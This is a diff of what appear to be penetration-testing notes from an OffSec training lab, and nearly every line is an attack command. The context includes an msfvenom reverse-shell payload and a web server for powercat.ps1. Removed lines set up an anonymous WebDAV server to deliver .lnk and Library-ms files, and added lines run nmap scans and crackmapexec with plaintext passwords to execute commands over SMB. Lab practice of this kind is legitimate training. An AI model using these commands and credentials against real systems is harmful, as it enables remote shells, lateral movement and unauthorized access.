@@ -550,10 +550,6 @@ msfvenom -p windows/shell/reverse_tcp lhost=192.168.45.229 lport=443 -f psh-cmd
 
 xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.194.250
 
-# serve up install.lnk and config.Library-ms from webdav
-mkdir /home/kali/relia/webdav
-/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
-
 # serve up powercat.ps1 from 8000
 python3 -m http.server 8000
 
@@ -1000,8 +996,12 @@ Local Admin Passwords:
 ```
 
 .226 (192)
-```
+```bash
+nmap 192.168.194.226
+crackmapexec smb 192.168.194.226 -u Administrator -p MusingExtraCounty98 --continue-on-success
+crackmapexec smb 192.168.194.226 -u backup_service -p 'It4Server' -X "whoami"
 
+sudo nmap -p- -Pn 192.168.194.226 -sS -T 5 --verbose
 ```
 
 .227 (192)
